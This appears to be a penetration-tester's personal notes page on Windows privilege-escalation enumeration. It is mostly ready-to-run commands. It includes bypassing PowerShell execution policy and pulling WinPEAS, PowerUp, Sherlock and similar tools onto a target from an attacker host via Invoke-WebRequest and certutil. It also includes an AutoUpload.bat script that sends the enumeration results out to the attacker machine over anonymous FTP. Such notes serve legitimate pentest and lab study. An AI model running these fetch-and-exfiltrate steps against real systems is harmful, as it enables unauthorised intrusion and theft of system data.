| PS Tools | WinPEAS | Seatbelt3 | Seatbelt4 |
| -------------- | -------------- | -------------- | -------------- |
| Sherlock.ps1  | winPEAS.bat | SeatbeltNet3.5AnyCPU.exe | SeatbeltNet4AnyCPU.exe |
| PowerUp.ps1 | winPEASany.exe | SeatbeltNet3.5x64.exe | SeatbeltNet4x64.exe |
| jaws-enum.ps1 | winPEASx64.exe | SeatbeltNet3.5x86.exe | SeatbeltNet4x86.exe |
|  | winPEASx86.exe |  |  |


Do you have RDP access? [[Port 3389 - RDP ~]]

#### Download to Kali
Kali:
```bash - kali
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220220/winPEAS.bat && wget https://github.com/carlospolop/PEASS-ng/releases/download/20220220/winPEASany.exe && wget https://github.com/carlospolop/PEASS-ng/releases/download/20220220/winPEASx64.exe && wget https://github.com/carlospolop/PEASS-ng/releases/download/20220220/winPEASx86.exe && wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1 && wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 && wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 && wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py && wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
```

#### AutoUpload.bat - ==REMEMBER TO CHANGE $KALI TO IP!==

```bash - kali
echo $KALI
```

```bash - kali
mousepad AutoUpload.bat
```

```powershell - windows
@echo off

echo anonymous> upload.txt
echo anonymous>> upload.txt
echo binary>>upload.txt

echo put JAWS-Enum.txt >> upload.txt
echo put PowerUp.txt >> upload.txt
echo put Sherlock.txt >> upload.txt
echo put winPEASx64.txt >> upload.txt
echo put systeminfo.txt >> upload.txt
echo put PrivescCheck.txt >> upload.txt

echo quit >> upload.txt

ftp -s:upload.txt $KALI

del upload.txt
```

![[Python#Server]]

#### Transfer to target - PowerShell - ==REMEMBER TO CHANGE $KALI TO IP!==

Check to see if you have PowerShell access:

```command prompt - windows
where /r C:\Windows powershell.exe
```

May need to run PowerShell with full path.

#### Bypass execution policy
```command prompt - windows
powershell -ep bypass
```

```powershell - windows
cd $env:TEMP; mkdir Tools; cd Tools; Invoke-WebRequest -Uri 'http://$KALI/winPEAS.bat' -OutFile winPEAS.bat; Invoke-WebRequest -Uri 'http://$KALI/winPEASany.exe' -OutFile winPEASany.exe; Invoke-WebRequest -Uri 'http://$KALI/winPEASx64.exe' -OutFile winPEASx64.exe; Invoke-WebRequest -Uri 'http://$KALI/winPEASx86.exe' -OutFile winPEASx86.exe; Invoke-WebRequest -Uri 'http://$KALI/Sherlock.ps1' -OutFile Sherlock.ps1; Invoke-WebRequest -Uri 'http://$KALI/PowerUp.ps1' -OutFile PowerUp.ps1; Invoke-WebRequest -Uri 'http://$KALI/jaws-enum.ps1' -OutFile jaws-enum.ps1; Invoke-WebRequest -Uri 'http://$KALI/PrivescCheck.ps1' -OutFile PrivescCheck.ps1; Invoke-WebRequest -Uri 'http://$KALI/AutoUpload.bat' -OutFile AutoUpload.bat
```

#### Transfer to target - CMD  - ==REMEMBER TO CHANGE $KALI TO IP!==
```command prompt - windows
mkdir %TEMP%\Tools && cd %TEMP%\Tools && certutil -urlcache -split -f http://$KALI/winPEAS.bat && certutil -urlcache -split -f http://$KALI/winPEASany.exe && certutil -urlcache -split -f http://$KALI/winPEASx64.exe && certutil -urlcache -split -f http://$KALI/winPEASx86.exe && certutil -urlcache -split -f http://$KALI/Sherlock.ps1 && certutil -urlcache -split -f http://$KALI/PowerUp.ps1 && certutil -urlcache -split -f http://$KALI/jaws-enum.ps1 && certutil -urlcache -split -f http://$KALI/PrivescCheck.ps1 && certutil -urlcache -split -f http://$KALI/AutoUpload.bat
```

#### Execute tools 
```powershell - winodws
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1; systeminfo > systeminfo.txt; . .\Sherlock.ps1; Find-AllVulns > Sherlock.txt; . .\PowerUp.ps1; Invoke-AllChecks > PowerUp.txt; .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt; .\winPEASx64.exe > winPEASx64.txt; . .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended > PrivescCheck.txt
```

#### Start FTP server and upload results

[[Python#FTP Server]]

```powershell - windows
cmd /c "AutoUpload.bat"
```

#### windows-exploit-suggester.py
AutoUpload will have uploaded the systeminfo.txt file to kali through FTP.

```bash - kali
chmod +x windows-exploit-suggester.py
```

```bash - kali
sudo ./windows-exploit-suggester.py --update
```

```bash - kail
pip install xlrd --upgrade
```

If pip is not installed:
[[Python#Install pip]]

![[Pasted image 20221110100601.png]]

From the above image, we need the "2022-02-03-mssb.xls" file:

```bash - kail
sudo ./windows-exploit-suggester.py --database 2022-02-04-mssb.xls --systeminfo systeminfo.txt
```

[[3._Kernel Exploits]]
